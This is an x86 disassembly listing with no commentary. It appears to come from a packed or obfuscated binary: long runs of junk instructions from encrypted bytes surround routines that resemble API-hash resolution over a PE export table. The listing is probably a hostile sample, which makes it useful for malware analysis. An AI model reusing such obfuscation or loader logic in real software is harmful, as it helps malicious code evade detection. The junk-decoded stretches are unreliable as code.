  4041fd:	loope  0x4041f0
  4041ff:	dec    ebp
  404200:	(bad)  
  404201:	inc    ebx
  404202:	scas   al,BYTE PTR es:[edi]
  404203:	stc    
  404204:	outs   dx,BYTE PTR ds:[esi]
  404205:	push   0xc
  404207:	jecxz  0x40427e
  404209:	leave  
  40420a:	int3   
  40420b:	popa   
  40420c:	mov    esi,0x883c55f3
  404211:	test   al,0x22
  404213:	out    dx,eax
  404214:	nop
  404215:	shl    BYTE PTR [esp+eax*8-0x272a7372],cl
  40421c:	js     0x40419f
  40421e:	and    dl,BYTE PTR [edx+ebp*4+0x15fc3fdf]
  404225:	xchg   BYTE PTR [ecx+0x59],bh
  404228:	push   ss
  404229:	cmp    ch,BYTE PTR [esi]
  40422b:	fdivp  st(2),st
  40422d:	rcr    DWORD PTR [ebx-0x13bb60a5],cl
  404233:	pop    esp
  404234:	ret    
  404235:	fs jnp 0x40420e
  404238:	cld    
  404239:	sub    DWORD PTR [ebp+ebx*4+0x16],0x48
  40423e:	pop    ecx
  40423f:	je     0x4041c8
  404241:	sub    BYTE PTR [esi+0x71],dh
  404244:	js     0x404205
  404246:	loope  0x404212
  404248:	jbe    0x404233
  40424a:	sar    DWORD PTR [esi-0x73dbe464],cl
  404250:	pop    ecx
  404251:	pop    ds
  404252:	in     al,0x5d
  404254:	inc    ebp
  404255:	or     eax,0x9283e54c
  40425a:	test   al,0xdb
  40425c:	test   eax,0xfebb311f
  404261:	in     al,dx
  404262:	add    ah,BYTE PTR [edi]
  404264:	imul   eax,DWORD PTR [eax],0x32
  404267:	xor    al,bl
  404269:	push   esp
  40426a:	xlat   BYTE PTR ds:[ebx]
  40426b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40426c:	dec    esp
  40426d:	in     eax,0x23
  40426f:	lds    edx,FWORD PTR [ebp+0x2fc581cf]
  404275:	ins    DWORD PTR es:[edi],dx
  404276:	mov    al,0x97
  404278:	xchg   ebp,eax
  404279:	inc    edx
  40427a:	fstp   QWORD PTR [esi-0x2ba2c5fb]
  404280:	ret    
  404281:	push   esp
  404282:	mov    ch,0x5c
  404284:	fs out dx,al
  404286:	icebp  
  404287:	retfw  0x987
  40428b:	int3   
  40428c:	mov    edi,0xd6dab27b
  404291:	cmc    
  404292:	push   eax
  404293:	shr    BYTE PTR [ecx],cl
  404295:	and    bh,bl
  404297:	jmp    0x6321:0x41bcf087
  40429e:	dec    ebp
  40429f:	push   esi
  4042a0:	jne    0x404248
  4042a2:	or     al,0x2d
  4042a4:	daa    
  4042a5:	arpl   WORD PTR [edi],ax
  4042a7:	xchg   esi,eax
  4042a8:	sub    DWORD PTR [ebp+ebp*4-0x5bdc9990],edi
  4042af:	push   esi
  4042b0:	sub    dl,cl
  4042b2:	test   al,0xbc
  4042b4:	cld    
  4042b5:	shr    DWORD PTR [edi],0xd3
  4042b8:	sbb    al,0x2c
  4042ba:	cld    
  4042bb:	dec    ebp
  4042bc:	dec    edx
  4042bd:	sti    
  4042be:	and    edi,DWORD PTR [edx-0x4a517a67]
  4042c4:	repz adc al,0x43
  4042c7:	js     0x4042f2
  4042c9:	hlt    
  4042ca:	jns    0x404328
  4042cc:	(bad)
  4042cf:	stc    
  4042d0:	scas   eax,DWORD PTR es:[edi]
  4042d1:	int3   
  4042d2:	xor    BYTE PTR ds:0x656b2041,ah
  4042d8:	inc    edx
  4042d9:	dec    ebx
  4042da:	cmp    esi,DWORD PTR [ebx+0x34a87a83]
  4042e0:	mov    dl,0x78
  4042e2:	push   esp
  4042e3:	and    BYTE PTR [edi-0x7e4b720b],0x26
  4042ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042eb:	in     eax,0xbe
  4042ed:	in     eax,dx
  4042ee:	cmp    eax,DWORD PTR [edi]
  4042f0:	dec    ebp
  4042f1:	xor    edi,edi
  4042f3:	shl    DWORD PTR [ebp+0xa],0x9
  4042f7:	scas   eax,DWORD PTR es:[edi]
  4042f8:	push   esp
  4042f9:	out    dx,eax
  4042fa:	add    BYTE PTR [ebp+0x1f],bl
  4042fd:	(bad)
  404300:	cld    
  404301:	inc    ecx
  404302:	push   ebp
  404303:	sub    eax,0x7975de48
  404308:	cs sti 
  40430a:	iret   
  40430b:	pop    ebx
  40430c:	jl     0x404314
  40430e:	popf   
  40430f:	dec    ecx
  404310:	sar    BYTE PTR cs:0x7711df98,1
  404317:	aam    0x57
  404319:	loop   0x4042e1
  40431b:	mov    ecx,0xc3e4117f
  404320:	and    al,0xea
  404322:	stos   BYTE PTR es:[edi],al
  404323:	fimul  DWORD PTR [ebx-0x55]
  404326:	mov    ds:0xf7d65197,al
  40432b:	(bad)  
  40432c:	call   0xcd96875c
  404331:	dec    esi
  404332:	sub    edi,DWORD PTR [eax-0x53]
  404335:	sbb    edi,DWORD PTR [ebx]
  404337:	fsub   QWORD PTR [ecx]
  40433a:	jp     0x4043a0
  40433c:	inc    edi
  40433d:	in     al,0xd6
  40433f:	and    ebx,DWORD PTR [edi]
  404341:	fs js  0x4042fd
  404344:	test   al,0xe0
  404346:	pop    eax
  404347:	jp     0x40437b
  404349:	dec    ebx
  40434b:	imul   esi,DWORD PTR [edi+ecx*8+0x572999d0],0x5b
  404353:	stos   DWORD PTR es:[edi],eax
  404354:	adc    eax,0x186ad263
  404359:	and    BYTE PTR [ecx-0x1b6843df],bl
  40435f:	in     eax,0x92
  404361:	data16 adc ch,ch
  404364:	push   esi
  404365:	inc    eax
  404366:	jecxz  0x40436a
  404368:	sub    bl,al
  40436a:	cmp    al,0xee
  40436c:	or     ecx,DWORD PTR [edx-0x63]
  40436f:	xchg   ebx,eax
  404370:	mov    dl,0x1
  404372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404373:	sti    
  404374:	and    esi,DWORD PTR [ecx-0x5d3a852b]
  40437a:	rcl    DWORD PTR [esi],0x23
  40437d:	out    0x4d,al
  40437f:	pop    ebx
  404380:	push   esp
  404381:	in     al,dx
  404382:	push   0xe7822d58
  404387:	imul   eax,edi,0x45
  40438a:	cld    
  40438b:	xor    al,BYTE PTR [ebp+0x458bf89c]
  404391:	cld    
  404392:	push   esi
  404393:	or     DWORD PTR ds:0x42ec6f,0x42e640
  40439d:	mov    esi,DWORD PTR [ebp-0x8]
  4043a0:	and    DWORD PTR ds:0x42ec67,edi
  4043a6:	mov    edx,0x7510854
  4043ab:	or     DWORD PTR ds:0x4302b5,0x1aa0
  4043b5:	xor    eax,edx
  4043b7:	add    DWORD PTR ds:0x42ec6f,0x4302b5
  4043c1:	xor    esi,edx
  4043c3:	mov    ecx,0x32729b
  4043c8:	or     DWORD PTR ds:0x43035f,0x42e648
  4043d2:	add    esi,ecx
  4043d4:	add    eax,ecx
  4043d6:	sub    DWORD PTR ds:0x42e64c,0x70e
  4043e0:	imul   eax,esi
  4043e3:	mov    esi,0x43d2
  4043e8:	mov    esi,DWORD PTR [ebp+0xc]
  4043eb:	cmp    esi,eax
  4043ed:	jne    0x4045f5
  4043f3:	mov    eax,DWORD PTR [ebp-0x4]
  4043f6:	mov    esi,DWORD PTR [ebp-0x8]
  4043f9:	xor    DWORD PTR ds:0x42ec63,0x42ec6b
  404403:	xor    eax,edx
  404405:	and    DWORD PTR ds:0x42ec6b,0x3e0c
  40440f:	xor    esi,edx
  404411:	xor    DWORD PTR ds:0x4302cd,0x798f
  40441b:	jmp    0x4045df
  404420:	jbe    0x40448b
  404422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404423:	adc    eax,0x6974d1a1
  404428:	sahf   
  404429:	es push 0x79
  40442c:	into   
  40442d:	(bad)  
  40442e:	pop    ebx
  40442f:	push   edx
  404430:	std    
  404431:	sbb    DWORD PTR [esi+0x7e],edi
  404434:	cdq    
  404435:	jg     0x4044b5
  404437:	jle    0x4043fb
  404439:	iret   
  40443a:	(bad)  
  40443b:	repz inc edx
  40443d:	retf   0x9b1c
  404440:	out    0xd8,eax
  404442:	dec    ebx
  404443:	in     eax,0x68
  404445:	mul    esi
  404447:	push   cs
  404448:	add    DWORD PTR [eax-0x64],esi
  40444b:	out    dx,al
  40444c:	je     0x4044b7
  40444e:	test   al,0x54
  404450:	dec    ebx
  404451:	sub    bl,ch
  404453:	into   
  404454:	ret    
  404455:	sub    dh,BYTE PTR [esi]
  404457:	aad    0x7d
  404459:	aad    0x96
  40445b:	mov    ebx,0x2872232f
  404460:	repnz lds ebp,FWORD PTR ds:0xa93af742
  404467:	cli    
  404468:	repz inc edi
  40446a:	fwait
  40446b:	div    BYTE PTR [edx+ebp*2-0x67318b64]
  404472:	imul   ecx,DWORD PTR [esi+0x7d55739],0xffffff92
  404479:	sub    eax,0x5b977ac4
  40447e:	and    dl,cl
  404480:	mov    ebp,0x79d5597f
  404485:	and    eax,0x45ee70e2
  40448a:	fisttp WORD PTR [edx]
  40448c:	(bad)  
  40448d:	in     eax,dx
  40448e:	stos   BYTE PTR es:[edi],al
  40448f:	or     al,ch
  404491:	sub    DWORD PTR [edx],0xffffffdc
  404494:	jno    0x404429
  404496:	hlt    
  404497:	push   0xb62ccace
  40449c:	out    0x5a,eax
  40449e:	cld    
  40449f:	sub    dh,BYTE PTR [esi-0x5e6522c9]
  4044a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044a6:	gs push ecx
  4044a8:	push   cs
  4044a9:	lds    ebx,FWORD PTR [ebx+0x67]
  4044ac:	(bad)  
  4044ad:	cs sbb edi,ebx
  4044b0:	clc    
  4044b1:	sub    al,0x25
  4044b3:	pop    eax
  4044b4:	inc    eax
  4044b5:	jb     0x40451a
  4044b7:	aas    
  4044b8:	cwde   
  4044b9:	mov    al,ds:0x2ac9a3bd
  4044be:	nop
  4044bf:	dec    edi
  4044c0:	mov    ss,WORD PTR [edi+0x38]
  4044c3:	loope  0x40446c
  4044c5:	fwait
  4044c6:	xor    bl,al
  4044c8:	retf   0x6325
  4044cb:	pop    ss
  4044cc:	or     dl,ah
  4044ce:	lods   al,BYTE PTR ds:[esi]
  4044cf:	inc    edx
  4044d0:	pusha  
  4044d1:	cmp    DWORD PTR cs:[ebx],0x78060d77
  4044d8:	cmc    
  4044d9:	mov    ebp,ebp
  4044db:	dec    ebp
  4044dc:	push   es
  4044dd:	dec    ebx
  4044de:	mov    edx,0x2954ef34
  4044e3:	dec    edx
  4044e4:	add    eax,0xf5372243
  4044e9:	std    
  4044ea:	test   DWORD PTR [ecx-0x76],esi
  4044ed:	and    eax,esi
  4044ef:	cmp    al,BYTE PTR [eax]
  4044f1:	rcl    BYTE PTR [ebx],cl
  4044f3:	or     bh,BYTE PTR [esi-0x70]
  4044f6:	popf   
  4044f7:	jo     0x4044cf
  4044f9:	iret   
  4044fa:	mov    bl,0x6e
  4044fc:	dec    eax
  4044fd:	sub    dh,bl
  4044ff:	xchg   ebp,eax
  404500:	into   
  404501:	sub    DWORD PTR [eax],ecx
  404503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404504:	imul   edi,esp,0x5f
  404507:	or     al,0x27
  404509:	bound  ebp,QWORD PTR [ebp-0x18]
  40450c:	cmc    
  40450d:	sub    eax,0x57444ef0
  404512:	mov    ah,0x1
  404514:	and    edi,DWORD PTR [ebx+0x21]
  404517:	jl     0x404553
  404519:	pop    ebx
  40451a:	sub    eax,0x62b4e2da
  40451f:	jle    0x40451d
  404521:	add    esp,DWORD PTR [ecx-0x29]
  404524:	mov    BYTE PTR [ecx],dh
  404526:	fcomp  QWORD PTR [edx+0xb2ac38]
  40452c:	push   es
  40452d:	jecxz  0x404591
  40452f:	enter  0xb20b,0x49
  404533:	sar    ecx,1
  404535:	repnz push eax
  404537:	xor    eax,0x55a49d35
  40453c:	jbe    0x40457f
  40453e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40453f:	in     eax,0x67
  404541:	repnz and DWORD PTR [edi*4+0x5a17ef10],edx
  404549:	(bad)  [edx+ecx*8]
  40454c:	xor    edi,eax
  40454e:	pop    edi
  40454f:	shl    BYTE PTR [edi],1
  404551:	and    ebx,0x6b
  404554:	cmp    eax,0xb217d1bc
  404559:	ins    DWORD PTR es:[edi],dx
  40455a:	lods   eax,DWORD PTR ds:[esi]
  40455b:	imul   esi,DWORD PTR [edx],0xffffffee
  40455e:	jbe    0x4045d8
  404560:	in     eax,0x5a
  404562:	rcl    BYTE PTR [edi],cl
  404564:	pop    edx
  404565:	enter  0xe891,0xa8
  404569:	not    bl
  40456b:	push   ebx
  40456c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40456d:	mov    ?,WORD PTR [edx]
  40456f:	or     bl,ch
  404571:	sbb    BYTE PTR [edx+0x4e67655],ch
  404577:	ret    
  404578:	jbe    0x40453b
  40457a:	fwait
  40457b:	leave  
  40457c:	stos   DWORD PTR es:[edi],eax
  40457d:	cmp    dh,dh
  40457f:	mov    cs,WORD PTR [ebx+0x79234fd1]
  404585:	bound  ebx,QWORD PTR [esi]
  404587:	in     al,0xaa
  404589:	mov    ds:0x185b3f73,eax
  40458e:	lea    eax,[edi]
  404590:	jnp    0x40454e
  404592:	mov    al,ds:0xf02305ee
  404597:	cdq    
  404598:	stos   BYTE PTR es:[edi],al
  404599:	cmc    
  40459a:	mov    ebp,0x1c345735
  40459f:	pusha  
  4045a0:	(bad)  
  4045a1:	push   ds
  4045a2:	inc    edi
  4045a3:	jno    0x4045df
  4045a5:	imul   eax,DWORD PTR [edi-0x3b464423],0xf66895bc
  4045af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045b0:	xor    al,0x40
  4045b2:	sbb    ch,BYTE PTR [edx-0x2e]
  4045b5:	div    DWORD PTR ds:[edi+0x5bdc4fd6]
  4045bc:	lock aad 0xf5
  4045bf:	pusha  
  4045c0:	xchg   BYTE PTR [edi],al
  4045c2:	shr    DWORD PTR [edx],1
  4045c4:	fdivr  DWORD PTR [edx]
  4045c6:	repz shr BYTE PTR [ebx-0x32],1
  4045ca:	and    DWORD PTR [edi],eax
  4045cc:	daa    
  4045cd:	fcmovbe st,st(0)
  4045cf:	sub    BYTE PTR [ebx],0x2
  4045d2:	pop    ebp
  4045d3:	dec    esi
  4045d4:	lods   eax,DWORD PTR ds:[esi]
  4045d5:	shl    DWORD PTR [edi+0x3a],1
  4045d8:	shl    DWORD PTR [ecx+ecx*1-0x5d5238e],cl
  4045df:	add    eax,ecx
  4045e1:	add    esi,ecx
  4045e3:	imul   eax,esi
  4045e6:	mov    DWORD PTR ds:0x430367,0x2c81
  4045f0:	jmp    0x4046a8
  4045f5:	and    DWORD PTR ds:0x4302b9,0x0
  4045ff:	jmp    0x404612
  404604:	xor    eax,eax
  404606:	xor    eax,DWORD PTR ds:0x4302b9
  40460c:	inc    eax
  40460d:	mov    ds:0x4302b9,eax
  404612:	cmp    DWORD PTR ds:0x4302b9,0x18
  404619:	jae    0x40466d
  40461f:	cmp    DWORD PTR ds:0x4302b9,0xd
  404626:	jne    0x404650
  40462c:	push   0x4871
  404631:	push   0x7618
  404636:	push   0x847f
  40463b:	push   DWORD PTR [ebp-0x1c]
  40463e:	push   DWORD PTR [ebp-0xc]
  404641:	push   DWORD PTR [ebp-0x14]
  404644:	push   DWORD PTR [ebp-0x10]
  404647:	push   DWORD PTR [ebp-0x10]
  40464a:	call   DWORD PTR ds:0x42ea93
  404650:	cmp    DWORD PTR ds:0x4302b9,0xc
  404657:	jne    0x404668
  40465d:	mov    eax,ds:0x4302b9
  404662:	inc    eax
  404663:	mov    ds:0x4302b9,eax
  404668:	jmp    0x404604
  40466d:	mov    eax,DWORD PTR [ebp+0xc]
  404670:	mov    eax,DWORD PTR [eax+0x78]
  404673:	mov    DWORD PTR [ebp+0xc],eax
  404676:	mov    eax,DWORD PTR [ebp-0x4]
  404679:	mov    esi,DWORD PTR [ebp-0x8]
  40467c:	xor    eax,edx
  40467e:	xor    esi,edx
  404680:	add    eax,ecx
  404682:	add    esi,ecx
  404684:	imul   eax,esi
  404687:	mov    esi,DWORD PTR [ebp+0xc]
  40468a:	cmp    esi,eax
  40468c:	mov    eax,DWORD PTR [ebp-0x4]
  40468f:	je     0x4043f6
  404695:	xor    eax,edx
  404697:	add    eax,ecx
  404699:	mov    ecx,DWORD PTR [ebp+0xc]
  40469c:	imul   eax,ecx
  40469f:	add    eax,DWORD PTR [ebp+0x8]
  4046a2:	mov    DWORD PTR [ebp+0xc],eax
  4046a5:	mov    eax,DWORD PTR [ebp+0xc]
  4046a8:	pop    esi
  4046a9:	leave  
  4046aa:	ret    0x8
  4046ad:	push   ebp
  4046ae:	mov    ebp,esp
  4046b0:	push   ecx
  4046b1:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4046b8:	mov    DWORD PTR ds:0x42ec53,0x122d
  4046c2:	mov    eax,DWORD PTR [ebp-0x4]
  4046c5:	mov    edx,DWORD PTR [ebp+0x10]
  4046c8:	mov    ecx,0x7510854
  4046cd:	sbb    DWORD PTR ds:0x4302b9,0x4302f1
  4046d7:	xor    eax,ecx
  4046d9:	sub    DWORD PTR ds:0x4302dd,0x42ec5b
  4046e3:	add    eax,0x32729b
  4046e8:	jmp    0x4049a4
  4046ed:	fnstenv [eax+0x4]
  4046f0:	loop   0x404687
  4046f2:	jb     0x4046cd
  4046f4:	jno    0x40470f
  4046f6:	in     eax,0x6e
  4046f8:	jne    0x4046c1
  4046fa:	dec    eax
  4046fb:	pop    ebp
  4046fc:	jnp    0x404722
  4046fe:	daa    
  4046ff:	jle    0x40477f
  404701:	xchg   ecx,eax
  404702:	jl     0x404782
  404704:	jle    0x404734
  404706:	(bad)  
  404707:	cmp    ebp,DWORD PTR [eax-0x212d9ea7]
  40470d:	jg     0x404724
  40470f:	test   edx,esi
  404711:	ss jmp 0x40472f
  404714:	aaa    
  404715:	inc    esp
  404716:	dec    ebp
  404717:	inc    ebx
  404718:	mov    eax,0x44aee9aa
  40471d:	push   eax
  40471e:	outs   dx,BYTE PTR ds:[esi]
  40471f:	fdivrp st(6),st
  404721:	imul   ecx,DWORD PTR [esi-0x489fca97],0x49
  404728:	lods   eax,DWORD PTR ds:[esi]
  404729:	ror    BYTE PTR [ecx+eiz*2],0xa3
  40472d:	(bad)  
  40472e:	call   0x6b51e1a7
  404733:	sub    BYTE PTR [ecx+0x13a5cba7],ch
  404739:	mov    bh,0xfd
  40473b:	jno    0x4046bd
  40473d:	xor    al,0xae
  40473f:	scas   eax,DWORD PTR es:[edi]
  404740:	adc    DWORD PTR [ebx],eax
  404742:	sti    
  404743:	ja     0x40473b
  404745:	pop    ecx
  404746:	in     al,0x92
  404748:	iret   
  404749:	bound  eax,QWORD PTR [esi+ebx*8]
  40474c:	fnstcw WORD PTR [edi]
  40474e:	ins    DWORD PTR es:[edi],dx
  40474f:	ror    DWORD PTR [eax+0x75],cl
  404752:	jge    0x404786
  404754:	std    
  404755:	mov    ebx,0xcb718bde
  40475a:	call   0x43495866
  40475f:	pop    ebx
  404760:	call   DWORD PTR [edi]
  404762:	push   edi
  404763:	jae    0x404703
  404765:	hlt    
  404766:	rcr    DWORD PTR [esi],0xd1
  404769:	lods   eax,DWORD PTR ds:[esi]
  40476a:	mov    WORD PTR ss:[esi-0x767623ed],?
  404771:	cmp    eax,0xcf4f1da2
  404776:	add    al,0x69
  404778:	mov    dh,0x31
  40477a:	imul   eax,DWORD PTR [edi+ebx*1+0x46e0cc09],0x5f
  404782:	stc    
  404783:	pop    ecx
  404784:	xlat   BYTE PTR ds:[ebx]
  404785:	aam    0xd
  404787:	iret   
  404788:	adc    bl,ch
  40478a:	cmp    BYTE PTR ds:0x2061da17,dl
  404790:	jns    0x4047e6
  404792:	and    BYTE PTR [esi-0x77],bh
  404795:	mov    ebp,0x31764ce5
  40479a:	pop    ds
  40479b:	cmp    eax,DWORD PTR [edi+0x719be59f]
  4047a1:	fmulp  st(5),st
  4047a3:	nop
  4047a4:	xchg   ebx,eax
  4047a5:	jmp    0x404796
  4047a7:	cmp    cl,bl
  4047a9:	mov    gs,WORD PTR [ebx]
  4047ab:	arpl   WORD PTR [edi+0x15e86576],di
  4047b1:	dec    ecx
  4047b2:	dec    ebp
  4047b3:	and    BYTE PTR [ebx+ebp*8+0x49e37c70],0x7d
  4047bb:	stc    
  4047bc:	fwait
  4047bd:	push   ss
  4047be:	ret    
  4047bf:	sbb    ecx,DWORD PTR [ebx+esi*1]
  4047c2:	nop
  4047c3:	dec    edi
  4047c4:	mov    cl,0x2
  4047c6:	pop    eax
  4047c7:	pop    eax
  4047c8:	bound  eax,QWORD PTR [ebx]
  4047ca:	retf   0x964
  4047cd:	ins    BYTE PTR es:[edi],dx
  4047ce:	mov    WORD PTR [esi+eax*8+0x66],fs
  4047d2:	lock sub edi,DWORD PTR [ecx+0x1b762ece]
  4047d9:	enter  0xfd87,0x8f
  4047dd:	cmp    bh,BYTE PTR [edi+0x66]
  4047e0:	xor    BYTE PTR [eax-0x5ff9524b],bh
  4047e6:	xchg   esi,eax
  4047e7:	dec    ebp
  4047e8:	cs mov bh,0x7f
  4047eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047ec:	(bad)  
  4047ee:	mov    al,BYTE PTR [eax-0x55c08eb6]
  4047f4:	mov    al,0xa6
  4047f6:	mov    eax,ebx
  4047f8:	mov    edx,0xebea1317
  4047fd:	scas   al,BYTE PTR es:[edi]
  4047fe:	push   ss
  4047ff:	outs   dx,BYTE PTR ds:[esi]
  404800:	pop    eax
  404801:	ror    edi,cl
  404803:	leave  
  404804:	jns    0x404786
  404806:	mov    dl,0xbb
  404808:	lods   eax,DWORD PTR ds:[esi]
  404809:	daa    
  40480a:	cmp    edi,eax
  40480c:	scas   al,BYTE PTR es:[edi]
  40480d:	push   eax
  40480e:	add    eax,eax
  404810:	xchg   ecx,eax
  404811:	or     eax,0x56c968aa
  404816:	(bad)  
  404817:	in     al,dx
  404818:	cmp    eax,0xb7a6385
  40481d:	and    al,0x22
  40481f:	fimul  DWORD PTR ds:0xba1e0200
  404825:	fsub   st,st(0)
  404827:	lea    edx,[ebx+0x38f67067]
  40482d:	jae    0x4048a8
  40482f:	pushf  
  404830:	sahf   
  404831:	cmp    al,0x10
  404833:	pop    ecx
  404834:	jne    0x404863
  404836:	mov    ds:0x8f563b17,al
  40483b:	and    DWORD PTR [edx],ebp
  40483d:	xchg   BYTE PTR [ebx-0x50],al
  404840:	push   ds
  404841:	scas   eax,DWORD PTR es:[edi]
  404842:	push   cs
  404843:	pop    ebx
  404844:	xor    DWORD PTR [eax],esp
  404846:	inc    edx
  404847:	ins    DWORD PTR es:[edi],dx
  404848:	push   0x3d
  40484a:	ins    DWORD PTR es:[edi],dx
  40484b:	pop    ss
  40484c:	imul   edi,DWORD PTR [edi],0xffffffa4
  40484f:	outs   dx,BYTE PTR ds:[esi]
  404850:	adc    dl,BYTE PTR [ecx+0x17]
  404853:	int    0x5a
  404855:	fs out dx,eax
  404857:	aaa    
  404858:	(bad)  
  404859:	and    BYTE PTR [eax],cl
  40485b:	xchg   edi,edx
  40485d:	cmc    
  40485e:	jne    0x404837
  404860:	inc    esi
  404861:	std    
  404862:	(bad)  
  404863:	jecxz  0x4048bb
  404865:	xchg   edi,eax
  404866:	xor    cl,bl
  404868:	push   cs
  404869:	dec    ebp
  40486a:	aam    0xcb
  40486c:	int3   
  40486d:	cmp    eax,0x673008e3
  404872:	xchg   ecx,eax
  404874:	dec    eax
  404875:	xor    esi,DWORD PTR [eax+esi*4+0x4f3108c4]
  40487c:	mov    ss,WORD PTR [ebx+0x5de4d7d6]
  404882:	in     al,0xfb
  404884:	in     eax,dx
  404885:	mov    ebx,0xc7cc4708
  40488a:	mov    ebx,0x2df8ea2
  40488f:	rol    BYTE PTR [ebx+eax*1-0x1fa1875b],1
  404896:	out    dx,eax
  404897:	(bad)  
  404898:	retf   0x5f5e
  40489b:	les    ebp,FWORD PTR [ecx+0x3fd897a4]
  4048a1:	inc    edx
  4048a2:	cmp    al,0x43
  4048a4:	xor    al,0x7e
  4048a6:	rcl    DWORD PTR ds:0x29b75c1e,0xd5
  4048ad:	popf   
  4048ae:	popf   
  4048af:	lods   al,BYTE PTR ds:[esi]
  4048b0:	inc    edi
  4048b1:	sar    dh,0xcb
  4048b4:	mov    ebx,0xb0f02a66
  4048b9:	jno    0x4048e0
  4048bb:	call   0x70b53ba0
  4048c0:	adc    dl,dh
  4048c2:	mov    ecx,0x1dd8b09f
  4048c7:	data16 fiadd WORD PTR ds:0x797ead06
  4048ce:	xchg   DWORD PTR [ebx],esp
  4048d0:	je     0x404929
  4048d2:	in     eax,0x59
  4048d4:	outs   dx,BYTE PTR ds:[esi]
  4048d5:	cdq    
  4048d6:	mov    bl,0x21
  4048d8:	mov    DWORD PTR [edx+0x8],0x2e06ee48
  4048df:	push   ss
  4048e0:	sbb    DWORD PTR [edx+eiz*2],0x11
  4048e4:	fild   WORD PTR [esi+ecx*1+0x2d7e1ae9]
  4048eb:	ss (bad) 
  4048ed:	jmp    0x3cfd:0x5b1be577
  4048f4:	mov    WORD PTR [esi+0x5d],ds
  4048f7:	repz arpl bp,dx
  4048fa:	jns    0x404935
  4048fc:	dec    edi
  4048fd:	cmp    eax,0x4ab2f868
  404902:	outs   dx,BYTE PTR ds:[esi]
  404903:	out    dx,eax
  404904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404905:	mov    cl,0x32
  404907:	int3   
  404908:	add    al,0xb7
  40490a:	jne    0x404947
  40490c:	in     eax,0xaa
  40490e:	inc    edx
  40490f:	out    dx,eax
  404910:	add    eax,0x2ab3f5a8
  404915:	out    0xbc,al
  404917:	xor    edx,eax
  404919:	push   ebp
  40491a:	out    dx,eax
  40491b:	dec    edi
  40491c:	jmp    0xee524b5f
  404921:	inc    esp
  404922:	push   esi
  404923:	ficomp DWORD PTR [edx-0x56]
  404926:	call   0x3d0c8dce
  40492b:	nop
  40492c:	dec    esi
  40492d:	sub    BYTE PTR [esi],ah
  40492f:	pop    ss
  404930:	frstor [ebp+esi*1+0x38a2181e]
  404937:	sub    al,0xde
  404939:	jnp    0x404946
  40493b:	and    ebp,DWORD PTR [edi-0x26]
  40493e:	push   ecx
  40493f:	lock add bh,cl
  404942:	jg     0x4048cf
  404944:	popf   
  404945:	push   0x4d
  404947:	call   0x8b8bccd
  40494c:	pop    ss
  40494d:	mov    ds:0xa4098114,eax
  404952:	loop   0x4049cd
  404954:	jg     0x4049a6
  404956:	and    ecx,DWORD PTR [edx+0x6f275090]
  40495c:	xchg   edi,eax
  40495d:	rcl    BYTE PTR [eax+0x1a],0xe
  404961:	hlt    
  404962:	scas   eax,DWORD PTR es:[edi]
  404963:	inc    eax
  404964:	ret    
  404965:	outs   dx,BYTE PTR ds:[esi]
  404966:	inc    edx
  404967:	stos   BYTE PTR es:[edi],al
  404968:	jecxz  0x404986
  40496a:	je     0x404936
  40496c:	adc    al,0x81
  40496e:	jl     0x40497f
  404970:	mov    WORD PTR [edx+0x7f9dfedd],gs
  404976:	les    edi,FWORD PTR [edx]
  404978:	ret    0x801
  40497b:	and    DWORD PTR [esi+0x4f],ebp
  40497e:	imul   ecx,esp,0x38945517
  404984:	ret    0xd70b
  404987:	or     eax,DWORD PTR [eax]
  404989:	popa   
  40498a:	ret    0xd4d6
  40498d:	stos   DWORD PTR es:[edi],eax
  40498e:	push   es
  40498f:	rol    BYTE PTR [esi+0x586237ea],0xce
  404996:	inc    edx
  404997:	or     DWORD PTR [edx-0x21d97046],ebx
  40499d:	adc    esp,ebp
  40499f:	leave  
  4049a0:	fsubp  st(3),st
  4049a2:	or     ecx,DWORD PTR [edx+0x25810289]
  4049a8:	pop    eax
  4049a9:	out    0x42,al
  4049ab:	add    BYTE PTR [eax],al
  4049ad:	add    BYTE PTR [eax],al
  4049af:	add    BYTE PTR [ebx],dh
  4049b1:	shl    BYTE PTR [ebx],cl
  4049b3:	adc    eax,0x42e658
  4049b8:	inc    edx
  4049b9:	mov    DWORD PTR ds:0x42e658,edx
  4049bf:	cmp    DWORD PTR ds:0x42e658,0xd
  4049c6:	jne    0x4049da
  4049cc:	push   0x1
  4049ce:	push   DWORD PTR [ebp-0x18]
  4049d1:	push   DWORD PTR [ebp-0xc]
  4049d4:	call   DWORD PTR ds:0x42e84f
  4049da:	cmp    DWORD PTR ds:0x42e658,0xc
  4049e1:	jne    0x4049f4
  4049e7:	mov    edx,DWORD PTR ds:0x42e658
  4049ed:	inc    edx
  4049ee:	mov    DWORD PTR ds:0x42e658,edx
  4049f4:	cmp    DWORD PTR ds:0x42e658,0x1c
  4049fb:	jb     0x4049b0
  404a01:	sub    DWORD PTR ds:0x42ec6b,ebx
  404a07:	mov    eax,DWORD PTR [ebp+0xc]
  404a0a:	xor    eax,ecx
  404a0c:	xor    DWORD PTR ds:0x43034f,ecx
  404a12:	push   esi
  404a13:	mov    esi,DWORD PTR [ebp+0x10]
  404a16:	add    DWORD PTR ds:0x42ec67,0x6bf6
  404a20:	mov    edx,0x32729b
  404a25:	sbb    DWORD PTR ds:0x430363,0x43035f
  404a2f:	add    eax,edx
  404a31:	add    DWORD PTR ds:0x42ec67,0x26eb
  404a3b:	mov    DWORD PTR [esi+0x4],eax
  404a3e:	adc    eax,DWORD PTR ds:0x43035b
  404a44:	mov    eax,DWORD PTR [ebp+0x14]
  404a47:	mov    esi,DWORD PTR [ebp+0x10]
  404a4a:	mov    DWORD PTR [esi+0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x18]
  404a50:	mov    esi,DWORD PTR [ebp+0x10]
  404a53:	mov    DWORD PTR [esi+0xc],eax
  404a56:	mov    eax,DWORD PTR [ebp+0x1c]
  404a59:	mov    esi,DWORD PTR [ebp+0x10]
